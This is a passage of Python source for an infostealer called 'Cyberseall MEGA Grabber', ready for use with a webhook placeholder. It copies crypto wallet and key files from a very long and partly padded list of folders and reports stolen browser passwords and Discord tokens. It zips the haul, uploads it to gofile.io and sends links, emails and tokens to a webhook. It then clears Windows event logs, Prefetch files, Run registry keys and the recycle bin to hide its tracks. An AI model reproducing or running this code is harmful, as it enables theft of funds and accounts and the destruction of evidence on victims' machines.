                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "Atomic"),
                os.path.join(os.getenv("APPDATA"), "Wasabi"),
                os.path.join(os.getenv("APPDATA"), "Sparrow"),
                os.path.join(os.getenv("APPDATA"), "BlueWallet"),
                os.path.join(os.getenv("APPDATA"), "GreenWallet"),
                os.path.join(os.getenv("APPDATA"), "Samourai"),
                os.path.join(os.getenv("APPDATA"), "Mycelium"),
                os.path.join(os.getenv("APPDATA"), "Bread"),
                os.path.join(os.getenv("APPDATA"), "Edge"),
                os.path.join(os.getenv("APPDATA"), "Copay"),
                os.path.join(os.getenv("APPDATA"), "BitPay"),
                os.path.join(os.getenv("APPDATA"), "Blockchain"),
                os.path.join(os.getenv("APPDATA"), "Luno"),
                os.path.join(os.getenv("APPDATA"), "Paxful"),
                os.path.join(os.getenv("APPDATA"), "LocalBitcoins"),
                os.path.join(os.getenv("APPDATA"), "Bisq"),
                os.path.join(os.getenv("APPDATA"), "Hodl"),
                os.path.join(os.getenv("APPDATA"), "Abra"),
                os.path.join(os.getenv("APPDATA"), "Celsius"),
                os.path.join(os.getenv("APPDATA"), "Nexo"),
                os.path.join(os.getenv("APPDATA"), "BlockFi"),
                os.path.join(os.getenv("APPDATA"), "Crypto.com"),
                os.path.join(os.getenv("APPDATA"), "Voyager"),
                os.path.join(os.getenv("APPDATA"), "Gemini"),
                os.path.join(os.getenv("APPDATA"), "Kraken"),
                os.path.join(os.getenv("APPDATA"), "KuCoin"),
                os.path.join(os.getenv("APPDATA"), "Huobi"),
                os.path.join(os.getenv("APPDATA"), "OKEx"),
                os.path.join(os.getenv("APPDATA"), "Gate.io"),
                os.path.join(os.getenv("APPDATA"), "Bitfinex"),
                os.path.join(os.getenv("APPDATA"), "Bitstamp"),
                os.path.join(os.getenv("APPDATA"), "Bittrex"),
                os.path.join(os.getenv("APPDATA"), "Poloniex"),
                os.path.join(os.getenv("APPDATA"), "HitBTC"),
                os.path.join(os.getenv("APPDATA"), "YoBit"),
                os.path.join(os.getenv("APPDATA"), "Changelly"),
                os.path.join(os.getenv("APPDATA"), "ShapeShift"),
                os.path.join(os.getenv("APPDATA"), "Uniswap"),
                os.path.join(os.getenv("APPDATA"), "SushiSwap"),
                os.path.join(os.getenv("APPDATA"), "PancakeSwap"),
                os.path.join(os.getenv("APPDATA"), "1inch"),
                os.path.join(os.getenv("APPDATA"), "Paraswap"),
                os.path.join(os.getenv("APPDATA"), "Matcha"),
                os.path.join(os.getenv("APPDATA"), "dYdX"),
                os.path.join(os.getenv("APPDATA"), "Compound"),
                os.path.join(os.getenv("APPDATA"), "Aave"),
                os.path.join(os.getenv("APPDATA"), "MakerDAO"),
                os.path.join(os.getenv("APPDATA"), "Yearn"),
                os.path.join(os.getenv("APPDATA"), "Curve"),
                os.path.join(os.getenv("APPDATA"), "Balancer"),
                os.path.join(os.getenv("APPDATA"), "Synthetix"),
                os.path.join(os.getenv("APPDATA"), "Bancor"),
                os.path.join(os.getenv("APPDATA"), "Kyber"),
                os.path.join(os.getenv("APPDATA"), "0x"),
                os.path.join(os.getenv("APPDATA"), "Loopring"),
                os.path.join(os.getenv("APPDATA"), "Ren"),
                os.path.join(os.getenv("APPDATA"), "THORChain"),
                os.path.join(os.getenv("APPDATA"), "Sifchain"),
                os.path.join(os.getenv("APPDATA"), "Osmosis"),
                os.path.join(os.getenv("APPDATA"), "Gravity"),
                os.path.join(os.getenv("APPDATA"), "Secret"),
                os.path.join(os.getenv("APPDATA"), "Akash"),
                os.path.join(os.getenv("APPDATA"), "Persistence"),
                os.path.join(os.getenv("APPDATA"), "Regen"),
                os.path.join(os.getenv("APPDATA"), "Sentinel"),
                os.path.join(os.getenv("APPDATA"), "IRISnet"),
                os.path.join(os.getenv("APPDATA"), "Starname"),
                os.path.join(os.getenv("APPDATA"), "e-Money"),
                os.path.join(os.getenv("APPDATA"), "Agoric"),
                os.path.join(os.getenv("APPDATA"), "Cyber"),
                os.path.join(os.getenv("APPDATA"), "Desmos"),
                os.path.join(os.getenv("APPDATA"), "Dig"),
                os.path.join(os.getenv("APPDATA"), "Fetch"),
                os.path.join(os.getenv("APPDATA"), "Ki"),
                os.path.join(os.getenv("APPDATA"), "MediBloc"),
                os.path.join(os.getenv("APPDATA"), "Rizon"),
                os.path.join(os.getenv("APPDATA"), "Shentu"),
                os.path.join(os.getenv("APPDATA"), "SifChain"),
                os.path.join(os.getenv("APPDATA"), "Stargaze"),
                os.path.join(os.getenv("APPDATA"), "Umee"),
                os.path.join(os.getenv("APPDATA"), "Vidulum"),
                os.path.join(os.getenv("APPDATA"), "Chihuahua"),
                os.path.join(os.getenv("APPDATA"), "BitCanna"),
                os.path.join(os.getenv("APPDATA"), "Comdex"),
                os.path.join(os.getenv("APPDATA"), "Juno"),
                os.path.join(os.getenv("APPDATA"), "LikeCoin"),
                os.path.join(os.getenv("APPDATA"), "OmniFlix"),
                os.path.join(os.getenv("APPDATA"), "Provenance"),
                os.path.join(os.getenv("APPDATA"), "Regen"),
                os.path.join(os.getenv("APPDATA"), "AssetMantle"),
                os.path.join(os.getenv("APPDATA"), "FetchAI"),
                os.path.join(os.getenv("APPDATA"), "Gravity Bridge"),
                os.path.join(os.getenv("APPDATA"), "Injective"),
                os.path.join(os.getenv("APPDATA"), "Stride"),
                os.path.join(os.getenv("APPDATA"), "Evmos"),
                os.path.join(os.getenv("APPDATA"), "Sommelier"),
                os.path.join(os.getenv("APPDATA"), "Canto"),
                os.path.join(os.getenv("APPDATA"), "Kava"),
                os.path.join(os.getenv("APPDATA"), "Cronos"),
                os.path.join(os.getenv("APPDATA"), "Crypto.org"),
                os.path.join(os.getenv("APPDATA"), "Thorchain"),
                os.path.join(os.getenv("APPDATA"), "Maya"),
                os.path.join(os.getenv("APPDATA"), "Axelar"),
                os.path.join(os.getenv("APPDATA"), "Celestia"),
                os.path.join(os.getenv("APPDATA"), "Neutron"),
                os.path.join(os.getenv("APPDATA"), "Noble"),
                os.path.join(os.getenv("APPDATA"), "Dymension"),
                os.path.join(os.getenv("APPDATA"), "Saga"),
                os.path.join(os.getenv("APPDATA"), "Archway"),
                os.path.join(os.getenv("APPDATA"), "Coreum"),
                os.path.join(os.getenv("APPDATA"), "XPLA"),
                os.path.join(os.getenv("APPDATA"), "Migaloo"),
                os.path.join(os.getenv("APPDATA"), "Jackal"),
                os.path.join(os.getenv("APPDATA"), "Teritori"),
                os.path.join(os.getenv("APPDATA"), "Nolus"),
                os.path.join(os.getenv("APPDATA"), "Composable"),
                os.path.join(os.getenv("APPDATA"), "Picasso"),
                os.path.join(os.getenv("APPDATA"), "Centauri"),
                os.path.join(os.getenv("APPDATA"), "Quasar"),
                os.path.join(os.getenv("APPDATA"), "Quicksilver"),
                os.path.join(os.getenv("APPDATA"), "Lava"),
                os.path.join(os.getenv("APPDATA"), "Gitopia"),
                os.path.join(os.getenv("APPDATA"), "Passage"),
                os.path.join(os.getenv("APPDATA"), "Planq"),
                os.path.join(os.getenv("APPDATA"), "Loyal"),
                os.path.join(os.getenv("APPDATA"), "Humans"),
                os.path.join(os.getenv("APPDATA"), "Empowerchain"),
                os.path.join(os.getenv("APPDATA"), "Kyve"),
                os.path.join(os.getenv("APPDATA"), "Source"),
                os.path.join(os.getenv("APPDATA"), "Cheqd"),
                os.path.join(os.getenv("APPDATA"), "Lumnetwork"),
                os.path.join(os.getenv("APPDATA"), "Impacthub"),
                os.path.join(os.getenv("APPDATA"), "Ixo"),
                os.path.join(os.getenv("APPDATA"), "Oraichain"),
                os.path.join(os.getenv("APPDATA"), "Bitsong"),
                os.path.join(os.getenv("APPDATA"), "Konstellation"),
                os.path.join(os.getenv("APPDATA"), "Tgrade"),
                os.path.join(os.getenv("APPDATA"), "Omniflix"),
                os.path.join(os.getenv("APPDATA"), "Cerberus"),
                os.path.join(os.getenv("APPDATA"), "Furya"),
                os.path.join(os.getenv("APPDATA"), "Rebus"),
                os.path.join(os.getenv("APPDATA"), "Cudos"),
                os.path.join(os.getenv("APPDATA"), "Fetchhub"),
                os.path.join(os.getenv("APPDATA"), "Galaxy"),
                os.path.join(os.getenv("APPDATA"), "Meme"),
                os.path.join(os.getenv("APPDATA"), "Nomic"),
                os.path.join(os.getenv("APPDATA"), "Onomy"),
                os.path.join(os.getenv("APPDATA"), "8ball"),
                os.path.join(os.getenv("APPDATA"), "Marble"),
                os.path.join(os.getenv("APPDATA"), "Nyx"),
                os.path.join(os.getenv("APPDATA"), "Nym"),
                os.path.join(os.getenv("APPDATA"), "Penumbra"),
                os.path.join(os.getenv("APPDATA"), "Anoma"),
                os.path.join(os.getenv("APPDATA"), "Namada"),
                os.path.join(os.getenv("APPDATA"), "Heliax"),
                os.path.join(os.getenv("APPDATA"), "Shielded"),
                os.path.join(os.getenv("APPDATA"), "Zcash"),
                os.path.join(os.getenv("APPDATA"), "Pirate"),
                os.path.join(os.getenv("APPDATA"), "Hush"),
                os.path.join(os.getenv("APPDATA"), "Komodo"),
                os.path.join(os.getenv("APPDATA"), "Horizen"),
                os.path.join(os.getenv("APPDATA"), "Firo"),
                os.path.join(os.getenv("APPDATA"), "Beam"),
                os.path.join(os.getenv("APPDATA"), "Grin"),
                os.path.join(os.getenv("APPDATA"), "MimbleWimble"),
                os.path.join(os.getenv("APPDATA"), "Epic"),
                os.path.join(os.getenv("APPDATA"), "Litecash"),
                os.path.join(os.getenv("APPDATA"), "Grimm"),
                os.path.join(os.getenv("APPDATA"), "Defis"),
                os.path.join(os.getenv("APPDATA"), "Swap"),
                os.path.join(os.getenv("APPDATA"), "Lelantus"),
                os.path.join(os.getenv("APPDATA"), "Sigma"),
                os.path.join(os.getenv("APPDATA"), "Zerocoin"),
                os.path.join(os.getenv("APPDATA"), "Zerocash"),
                os.path.join(os.getenv("APPDATA"), "Bulletproofs"),
                os.path.join(os.getenv("APPDATA"), "Confidential"),
                os.path.join(os.getenv("APPDATA"), "Private"),
                os.path.join(os.getenv("APPDATA"), "Anonymous"),
                os.path.join(os.getenv("APPDATA"), "Stealth"),
                os.path.join(os.getenv("APPDATA"), "Hidden"),
                os.path.join(os.getenv("APPDATA"), "Secret"),
                os.path.join(os.getenv("APPDATA"), "Dark"),
                os.path.join(os.getenv("APPDATA"), "Shadow"),
                os.path.join(os.getenv("APPDATA"), "Ghost"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "Invisible"),
                os.path.join(os.getenv("APPDATA"), "Untraceable"),
                os.path.join(os.getenv("APPDATA"), "Unlinkable"),
                os.path.join(os.getenv("APPDATA"), "Fungible"),
                os.path.join(os.getenv("APPDATA"), "Mixable"),
                os.path.join(os.getenv("APPDATA"), "Tumbler"),
                os.path.join(os.getenv("APPDATA"), "Mixer"),
                os.path.join(os.getenv("APPDATA"), "Blender"),
                os.path.join(os.getenv("APPDATA"), "Washer"),
                os.path.join(os.getenv("APPDATA"), "Cleaner"),
                os.path.join(os.getenv("APPDATA"), "Tornado"),
                os.path.join(os.getenv("APPDATA"), "Cyclone"),
                os.path.join(os.getenv("APPDATA"), "Hurricane"),
                os.path.join(os.getenv("APPDATA"), "Storm"),
                os.path.join(os.getenv("APPDATA"), "Typhoon"),
                os.path.join(os.getenv("APPDATA"), "Whirlpool"),
                os.path.join(os.getenv("APPDATA"), "Vortex"),
                os.path.join(os.getenv("APPDATA"), "Spiral"),
                os.path.join(os.getenv("APPDATA"), "Twister"),
                os.path.join(os.getenv("APPDATA"), "Swirl"),
                os.path.join(os.getenv("APPDATA"), "Spin"),
                os.path.join(os.getenv("APPDATA"), "Rotate"),
                os.path.join(os.getenv("APPDATA"), "Turn"),
                os.path.join(os.getenv("APPDATA"), "Revolve"),
                os.path.join(os.getenv("APPDATA"), "Circle"),
                os.path.join(os.getenv("APPDATA"), "Round"),
                os.path.join(os.getenv("APPDATA"), "Loop"),
                os.path.join(os.getenv("APPDATA"), "Cycle"),
                os.path.join(os.getenv("APPDATA"), "Ring"),
                os.path.join(os.getenv("APPDATA"), "Orbit"),
                os.path.join(os.getenv("APPDATA"), "Ellipse"),
                os.path.join(os.getenv("APPDATA"), "Oval"),
                os.path.join(os.getenv("APPDATA"), "Sphere"),
                os.path.join(os.getenv("APPDATA"), "Globe"),
                os.path.join(os.getenv("APPDATA"), "Ball"),
                os.path.join(os.getenv("APPDATA"), "Bubble"),
                os.path.join(os.getenv("APPDATA"), "Drop"),
                os.path.join(os.getenv("APPDATA"), "Droplet"),
                os.path.join(os.getenv("APPDATA"), "Tear"),
                os.path.join(os.getenv("APPDATA"), "Pearl"),
                os.path.join(os.getenv("APPDATA"), "Gem"),
                os.path.join(os.getenv("APPDATA"), "Diamond"),
                os.path.join(os.getenv("APPDATA"), "Crystal"),
                os.path.join(os.getenv("APPDATA"), "Stone"),
                os.path.join(os.getenv("APPDATA"), "Rock"),
                os.path.join(os.getenv("APPDATA"), "Mineral"),
                os.path.join(os.getenv("APPDATA"), "Metal"),
                os.path.join(os.getenv("APPDATA"), "Gold"),
                os.path.join(os.getenv("APPDATA"), "Silver"),
                os.path.join(os.getenv("APPDATA"), "Platinum"),
                os.path.join(os.getenv("APPDATA"), "Palladium"),
                os.path.join(os.getenv("APPDATA"), "Rhodium"),
                os.path.join(os.getenv("APPDATA"), "Iridium"),
                os.path.join(os.getenv("APPDATA"), "Osmium"),
                os.path.join(os.getenv("APPDATA"), "Ruthenium"),
                os.path.join(os.getenv("APPDATA"), "Rhenium"),
                os.path.join(os.getenv("APPDATA"), "Tungsten"),
                os.path.join(os.getenv("APPDATA"), "Titanium"),
                os.path.join(os.getenv("APPDATA"), "Vanadium"),
                os.path.join(os.getenv("APPDATA"), "Chromium"),
                os.path.join(os.getenv("APPDATA"), "Manganese"),
                os.path.join(os.getenv("APPDATA"), "Iron"),
                os.path.join(os.getenv("APPDATA"), "Cobalt"),
                os.path.join(os.getenv("APPDATA"), "Nickel"),
                os.path.join(os.getenv("APPDATA"), "Copper"),
                os.path.join(os.getenv("APPDATA"), "Zinc"),
                os.path.join(os.getenv("APPDATA"), "Gallium"),
                os.path.join(os.getenv("APPDATA"), "Germanium"),
                os.path.join(os.getenv("APPDATA"), "Arsenic"),
                os.path.join(os.getenv("APPDATA"), "Selenium"),
                os.path.join(os.getenv("APPDATA"), "Bromine"),
                os.path.join(os.getenv("APPDATA"), "Krypton"),
                os.path.join(os.getenv("APPDATA"), "Rubidium"),
                os.path.join(os.getenv("APPDATA"), "Strontium"),
                os.path.join(os.getenv("APPDATA"), "Yttrium"),
                os.path.join(os.getenv("APPDATA"), "Zirconium"),
                os.path.join(os.getenv("APPDATA"), "Niobium"),
                os.path.join(os.getenv("APPDATA"), "Molybdenum"),
                os.path.join(os.getenv("APPDATA"), "Technetium"),
                os.path.join(os.getenv("APPDATA"), "Ruthenium"),
                os.path.join(os.getenv("APPDATA"), "Rhodium"),
                os.path.join(os.getenv("APPDATA"), "Palladium"),
                os.path.join(os.getenv("APPDATA"), "Silver"),
                os.path.join(os.getenv("APPDATA"), "Cadmium"),
                os.path.join(os.getenv("APPDATA"), "Indium"),
                os.path.join(os.getenv("APPDATA"), "Tin"),
                os.path.join(os.getenv("APPDATA"), "Antimony"),
                os.path.join(os.getenv("APPDATA"), "Tellurium"),
                os.path.join(os.getenv("APPDATA"), "Iodine"),
                os.path.join(os.getenv("APPDATA"), "Xenon"),
                os.path.join(os.getenv("APPDATA"), "Cesium"),
                os.path.join(os.getenv("APPDATA"), "Barium"),
                os.path.join(os.getenv("APPDATA"), "Lanthanum"),
                os.path.join(os.getenv("APPDATA"), "Cerium"),
                os.path.join(os.getenv("APPDATA"), "Praseodymium"),
                os.path.join(os.getenv("APPDATA"), "Neodymium"),
                os.path.join(os.getenv("APPDATA"), "Promethium"),
                os.path.join(os.getenv("APPDATA"), "Samarium"),
                os.path.join(os.getenv("APPDATA"), "Europium"),
                os.path.join(os.getenv("APPDATA"), "Gadolinium"),
                os.path.join(os.getenv("APPDATA"), "Terbium"),
                os.path.join(os.getenv("APPDATA"), "Dysprosium"),
                os.path.join(os.getenv("APPDATA"), "Holmium"),
                os.path.join(os.getenv("APPDATA"), "Erbium"),
                os.path.join(os.getenv("APPDATA"), "Thulium"),
                os.path.join(os.getenv("APPDATA"), "Ytterbium"),
                os.path.join(os.getenv("APPDATA"), "Lutetium"),
                os.path.join(os.getenv("APPDATA"), "Hafnium"),
                os.path.join(os.getenv("APPDATA"), "Tantalum"),
                os.path.join(os.getenv("APPDATA"), "Tungsten"),
                os.path.join(os.getenv("APPDATA"), "Rhenium"),
                os.path.join(os.getenv("APPDATA"), "Osmium"),
                os.path.join(os.getenv("APPDATA"), "Iridium"),
                os.path.join(os.getenv("APPDATA"), "Platinum"),
                os.path.join(os.getenv("APPDATA"), "Gold"),
                os.path.join(os.getenv("APPDATA"), "Mercury"),
                os.path.join(os.getenv("APPDATA"), "Thallium"),
                os.path.join(os.getenv("APPDATA"), "Lead"),
                os.path.join(os.getenv("APPDATA"), "Bismuth"),
                os.path.join(os.getenv("APPDATA"), "Polonium"),
                os.path.join(os.getenv("APPDATA"), "Astatine"),
                os.path.join(os.getenv("APPDATA"), "Radon"),
                os.path.join(os.getenv("APPDATA"), "Francium"),
                os.path.join(os.getenv("APPDATA"), "Radium"),
                os.path.join(os.getenv("APPDATA"), "Actinium"),
                os.path.join(os.getenv("APPDATA"), "Thorium"),
                os.path.join(os.getenv("APPDATA"), "Protactinium"),
                os.path.join(os.getenv("APPDATA"), "Uranium"),
                os.path.join(os.getenv("APPDATA"), "Neptunium"),
                os.path.join(os.getenv("APPDATA"), "Plutonium"),
                os.path.join(os.getenv("APPDATA"), "Americium"),
                os.path.join(os.getenv("APPDATA"), "Curium"),
                os.path.join(os.getenv("APPDATA"), "Berkelium"),
                os.path.join(os.getenv("APPDATA"), "Californium"),
                os.path.join(os.getenv("APPDATA"), "Einsteinium"),
                os.path.join(os.getenv("APPDATA"), "Fermium"),
                os.path.join(os.getenv("APPDATA"), "Mendelevium"),
                os.path.join(os.getenv("APPDATA"), "Nobelium"),
                os.path.join(os.getenv("APPDATA"), "Lawrencium"),
                os.path.join(os.getenv("APPDATA"), "Rutherfordium"),
                os.path.join(os.getenv("APPDATA"), "Dubnium"),
                os.path.join(os.getenv("APPDATA"), "Seaborgium"),
                os.path.join(os.getenv("APPDATA"), "Bohrium"),
                os.path.join(os.getenv("APPDATA"), "Hassium"),
                os.path.join(os.getenv("APPDATA"), "Meitnerium"),
                os.path.join(os.getenv("APPDATA"), "Darmstadtium"),
                os.path.join(os.getenv("APPDATA"), "Roentgenium"),
                os.path.join(os.getenv("APPDATA"), "Copernicium"),
                os.path.join(os.getenv("APPDATA"), "Nihonium"),
                os.path.join(os.getenv("APPDATA"), "Flerovium"),
                os.path.join(os.getenv("APPDATA"), "Moscovium"),
                os.path.join(os.getenv("APPDATA"), "Livermorium"),
                os.path.join(os.getenv("APPDATA"), "Tennessine"),
                os.path.join(os.getenv("APPDATA"), "Oganesson")
            ]
            
            for cp in crypto_paths:
                if os.path.exists(cp):
                    for r, ds, fs in os.walk(cp):
                        for f in fs:
                            if f.lower().endswith(('.wallet','.dat','.key','.json','.txt')) and os.path.getsize(os.path.join(r,f)) < 10*1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "crypto_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 25:
                                    break
                        if len(files_data) >= 25:
                            break
                    if len(files_data) >= 25:
                        break
            
            self.f = files_data
            with open(os.path.join(self.d, "files.txt"), "w") as f:
                f.write("\n".join(files_data))
        except:
            pass

    def si(self):
        try:
            sys_info = {
                "user": getpass.getuser(),
                "computer": os.getenv("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "processor": platform.processor(),
                "architecture": platform.architecture()[0],
                "ip": socket.gethostbyname(socket.gethostname()),
                "python": platform.python_version(),
                "tokens_found": len(set(self.t)),
                "valid_tokens": len(self.vt),
                "passwords_found": len(self.p),
                "files_found": len(self.f)
            }
            with open(os.path.join(self.d, "system_info.json"), "w") as f:
                json.dump(sys_info, f, indent=2)
            with open(os.path.join(self.d, "valid_tokens.json"), "w") as f:
                json.dump(self.vt, f, indent=2)
        except:
            pass

    def up(self):
        try:
            with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(self.d):
                    for file in files:
                        if not file.endswith('.zip'):
                            fp = os.path.join(root, file)
                            zf.write(fp, os.path.relpath(fp, self.d))
            
            files = {"file": open(self.zf, "rb")}
            resp = requests.post("https://store1.gofile.io/uploadFile", files=files)
            files["file"].close()
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    self.link = data["data"]["downloadPage"]
                else:
                    self.link = "Upload failed"
            else:
                self.link = "Upload failed"
            
            try:
                os.remove(self.zf)
            except:
                pass
        except:
            self.link = "Upload failed"

    def send(self):
        try:
            embed = {
                "embeds": [{
                    "title": "🔥 CYBERSEALL MEGA GRABBER v3.0",
                    "color": 0xff0000,
                    "fields": [
                        {
                            "name": "💎 Results",
                            "value": "```" + str(len(set(self.t))) + " Raw Tokens\n" + str(len(self.vt)) + " Valid Tokens\n" + str(len(self.p)) + " Browser Passwords\n" + str(len(self.f)) + " Keyword Files```"
                        },
                        {
                            "name": "💻 Target",
                            "value": "```" + getpass.getuser() + "@" + os.getenv("COMPUTERNAME", "?") + "```"
                        },
                        {
                            "name": "📁 Download",
                            "value": "[**CLICK HERE TO DOWNLOAD**](" + str(self.link if hasattr(self, 'link') else 'Failed') + ")",
                            "inline": False
                        }
                    ],
                    "footer": {"text": "Cyberseall MEGA Grabber v3.0 - Enhanced"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                }]
            }
            
            requests.post(self.w, json=embed, timeout=10)
            
            if len(self.vt) > 0:
                for i, token_info in enumerate(self.vt[:3]):
                    token_embed = {
                        "embeds": [{
                            "title": "✅ VALID TOKEN #" + str(i+1),
                            "color": 0x00ff00,
                            "fields": [
                                {
                                    "name": "👤 User",
                                    "value": "```" + token_info.get('username', '?') + "#" + token_info.get('discriminator', '?') + "```"
                                },
                                {
                                    "name": "📧 Email",
                                    "value": "```" + str(token_info.get('email', 'Hidden')) + "```"
                                },
                                {
                                    "name": "🔐 Token",
                                    "value": "```" + token_info['token'][:50] + "...```"
                                },
                                {
                                    "name": "💎 Premium",
                                    "value": "```Type: " + str(token_info.get('premium_type', 0)) + "\nMFA: " + str(token_info.get('mfa_enabled', False)) + "\nVerified: " + str(token_info.get('verified', False)) + "```"
                                }
                            ],
                            "footer": {"text": "Valid Token Info"},
                            "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                        }]
                    }
                    requests.post(self.w, json=token_embed, timeout=5)
        except:
            pass

    def cleanup(self):
        """Bereinigt den cyberseall Ordner nach dem Senden"""
        try:
            import time
            time.sleep(2)  # Kurz warten damit Upload abgeschlossen ist
            
            if os.path.exists(self.d):
                def force_remove_readonly(func, path, exc):
                    try:
                        os.chmod(path, 0o777)
                        func(path)
                    except:
                        pass
                
                try:
                    shutil.rmtree(self.d, onerror=force_remove_readonly)
                except:
                    try:
                        for root, dirs, files in os.walk(self.d, topdown=False):
                            for name in files:
                                try:
                                    file_path = os.path.join(root, name)
                                    os.chmod(file_path, 0o777)
                                    os.remove(file_path)
                                except:
                                    pass
                            for name in dirs:
                                try:
                                    dir_path = os.path.join(root, name)
                                    os.chmod(dir_path, 0o777)
                                    os.rmdir(dir_path)
                                except:
                                    pass
                        try:
                            os.rmdir(self.d)
                        except:
                            pass
                    except:
                        pass
                
                # Zusätzliche Bereinigung von temporären Dateien
                try:
                    temp_dir = os.getenv("TEMP")
                    if temp_dir and os.path.exists(temp_dir):
                        for file in os.listdir(temp_dir):
                            if "cyberseall" in file.lower() or file.startswith("grab_"):
                                try:
                                    file_path = os.path.join(temp_dir, file)
                                    if os.path.isfile(file_path):
                                        os.remove(file_path)
                                except:
                                    pass
                except:
                    pass
                
                # Browser-Cache leeren (optional)
                try:
                    browser_cache_paths = [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Cache"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Cache"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Cache")
                    ]
                    
                    for cache_path in browser_cache_paths:
                        if os.path.exists(cache_path):
                            try:
                                for file in os.listdir(cache_path):
                                    if "cyberseall" in file.lower():
                                        try:
                                            os.remove(os.path.join(cache_path, file))
                                        except:
                                            pass
                            except:
                                pass
                except:
                    pass
                
                # Registry-Spuren entfernen (Windows)
                try:
                    import winreg
                    reg_paths = [
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
                    ]
                    
                    for reg_path in reg_paths:
                        try:
                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
                            i = 0
                            while True:
                                try:
                                    name, value, type = winreg.EnumValue(key, i)
                                    if "cyberseall" in name.lower() or "cyberseall" in value.lower():
                                        winreg.DeleteValue(key, name)
                                    else:
                                        i += 1
                                except WindowsError:
                                    break
                            winreg.CloseKey(key)
                        except:
                            pass
                except:
                    pass
                
                # Prozess-Spuren entfernen
                try:
                    current_process = os.getpid()
                    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                        try:
                            if proc.info['pid'] != current_process:
                                cmdline = ' '.join(proc.info['cmdline']) if proc.info['cmdline'] else ''
                                if "cyberseall" in cmdline.lower() or "grabber" in cmdline.lower():
                                    proc.terminate()
                        except:
                            pass
                except:
                    pass
                
                # Event-Log Spuren entfernen (falls möglich)
                try:
                    subprocess.run(['wevtutil', 'cl', 'Application'], capture_output=True, timeout=5)
                    subprocess.run(['wevtutil', 'cl', 'System'], capture_output=True, timeout=5)
                except:
                    pass
                
                # Prefetch-Dateien entfernen
                try:
                    prefetch_path = os.path.join(os.getenv("WINDIR", "C:\\Windows"), "Prefetch")
                    if os.path.exists(prefetch_path):
                        for file in os.listdir(prefetch_path):
                            if "cyberseall" in file.lower() or "grabber" in file.lower() or "python" in file.lower():
                                try:
                                    os.remove(os.path.join(prefetch_path, file))
                                except:
                                    pass
                except:
                    pass
                
                # Recent-Dateien entfernen
                try:
                    recent_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Recent")
                    if os.path.exists(recent_path):
                        for file in os.listdir(recent_path):
                            if "cyberseall" in file.lower() or "grabber" in file.lower():
                                try:
                                    os.remove(os.path.join(recent_path, file))
                                except:
                                    pass
                except:
                    pass
                
                # Papierkorb leeren
                try:
                    subprocess.run(['powershell', '-Command', 'Clear-RecycleBin -Force'], capture_output=True, timeout=10)
                except:
                    pass
                
        except Exception as e:
            pass

# WEBHOOK_PLACEHOLDER wird durch die Mini-Payload ersetzt
if __name__ == "__main__":
    CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
